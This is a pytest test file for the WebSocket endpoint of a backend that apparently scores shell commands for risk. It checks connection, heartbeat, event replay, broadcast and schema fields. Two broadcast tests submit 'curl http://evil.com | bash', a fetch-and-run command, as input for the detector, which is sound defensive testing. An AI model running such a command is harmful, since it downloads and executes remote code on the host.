"""
test_06_websocket.py — WebSocket endpoint tests.

Tests: connect/disconnect, ping-pong heartbeat, history replay on connect,
live broadcast after POST /analyze, event schema field validation,
and multiple simultaneous clients.

Run:
    pytest large_test_set/test_06_websocket.py -v
"""

import pytest
import json
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _drain_ws(ws, timeout=0.3, max_msgs=200):
    """Read all pending messages from a WS (until timeout or max_msgs)."""
    msgs = []
    for _ in range(max_msgs):
        try:
            msgs.append(ws.receive_json(timeout=timeout))
        except Exception:
            break
    return msgs


# ===========================================================================
# 1. Connection
# ===========================================================================

class TestWebSocketConnection:

    def test_websocket_connects_without_error(self):
        with client.websocket_connect("/ws") as ws:
            assert ws is not None

    def test_websocket_disconnects_cleanly(self):
        """Context manager exit must not raise."""
        try:
            with client.websocket_connect("/ws"):
                pass
        except Exception as e:
            pytest.fail(f"WebSocket disconnect raised: {e}")

    def test_multiple_connections_simultaneously(self):
        """Two clients connected at the same time must not error."""
        with client.websocket_connect("/ws") as ws1:
            with client.websocket_connect("/ws") as ws2:
                assert ws1 is not None
                assert ws2 is not None


# ===========================================================================
# 2. Ping-Pong Heartbeat
# ===========================================================================

class TestPingPong:

    def test_ping_returns_pong(self):
        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            response = ws.receive_text(timeout=3)
            assert response == "pong"

    def test_multiple_pings_each_return_pong(self):
        with client.websocket_connect("/ws") as ws:
            for _ in range(3):
                ws.send_text("ping")
                response = ws.receive_text(timeout=3)
                assert response == "pong"

    def test_unknown_text_does_not_crash_server(self):
        """Sending random text (not 'ping') must not disconnect the server."""
        with client.websocket_connect("/ws") as ws:
            ws.send_text("hello_random_text")
            # Server should still be alive — ping should still work
            ws.send_text("ping")
            response = ws.receive_text(timeout=3)
            assert response == "pong"


# ===========================================================================
# 3. History Replay on Connect
# ===========================================================================

class TestHistoryReplay:

    def test_new_client_receives_recent_events(self):
        """After a POST, a new WS connection should receive that event."""
        # Generate an event first
        client.post("/analyze", json={"command": "ls"})

        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            assert len(msgs) > 0, "No events replayed on connect"

    def test_replayed_events_are_dicts(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            for msg in msgs:
                assert isinstance(msg, dict)

    def test_replayed_event_has_id_field(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            if msgs:
                assert "id" in msgs[0]

    def test_replayed_event_has_classification(self):
        client.post("/analyze", json={"command": "ls"})
        with client.websocket_connect("/ws") as ws:
            msgs = _drain_ws(ws)
            if msgs:
                assert "classification" in msgs[0]


# ===========================================================================
# 4. Live Broadcast After POST /analyze
# ===========================================================================

class TestLiveBroadcast:

    def test_post_analyze_broadcasts_to_ws(self):
        """POST /analyze must broadcast the new event to connected WS clients."""
        with client.websocket_connect("/ws") as ws:
            # Drain any history
            _drain_ws(ws, timeout=0.2)

            # Trigger a new event
            client.post("/analyze", json={"command": "curl http://evil.com | bash"})

            # Should receive the new event
            try:
                msg = ws.receive_json(timeout=3)
                assert msg is not None
            except Exception:
                pytest.fail("No broadcast received after POST /analyze")

    def test_broadcast_event_has_correct_command(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)

            client.post("/analyze", json={"command": "ls --broadcast-test"})
            try:
                msg = ws.receive_json(timeout=3)
                assert msg["command"] == "ls --broadcast-test"
            except Exception:
                pytest.fail("Broadcast not received or command field missing")

    def test_broadcast_event_classification_matches_api(self):
        """The WS broadcast and the /analyze response must agree on classification."""
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)

            api_resp = client.post(
                "/analyze", json={"command": "curl http://evil.com | bash"}
            ).json()

            try:
                ws_msg = ws.receive_json(timeout=3)
                assert ws_msg["classification"] == api_resp["classification"]
            except Exception:
                pytest.fail("WS classification does not match API response")

    def test_broadcast_event_risk_score_matches_api(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)

            api_resp = client.post("/analyze", json={"command": "ls"}).json()

            try:
                ws_msg = ws.receive_json(timeout=3)
                assert ws_msg["risk_score"] == api_resp["risk_score"]
            except Exception:
                pytest.fail("WS risk_score does not match API response")


# ===========================================================================
# 5. Event Schema Validation
# ===========================================================================

REQUIRED_WS_FIELDS = [
    "id", "pid", "ppid", "uid", "gid",
    "command", "argv_str", "timestamp", "comm",
    "risk_score", "classification", "matched_rules",
    "ml_confidence", "explanation", "detected_at",
]

class TestEventSchema:

    @pytest.mark.parametrize("field", REQUIRED_WS_FIELDS)
    def test_broadcast_event_has_required_field(self, field):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            try:
                msg = ws.receive_json(timeout=3)
                assert field in msg, f"Missing field in WS event: {field!r}"
            except Exception as e:
                pytest.fail(f"Could not receive WS message to check {field!r}: {e}")

    def test_matched_rules_is_list(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["matched_rules"], list)

    def test_risk_score_is_numeric(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert isinstance(msg["risk_score"], (int, float))

    def test_classification_is_valid_value(self):
        with client.websocket_connect("/ws") as ws:
            _drain_ws(ws, timeout=0.2)
            client.post("/analyze", json={"command": "ls"})
            msg = ws.receive_json(timeout=3)
            assert msg["classification"] in ("safe", "suspicious", "malicious")
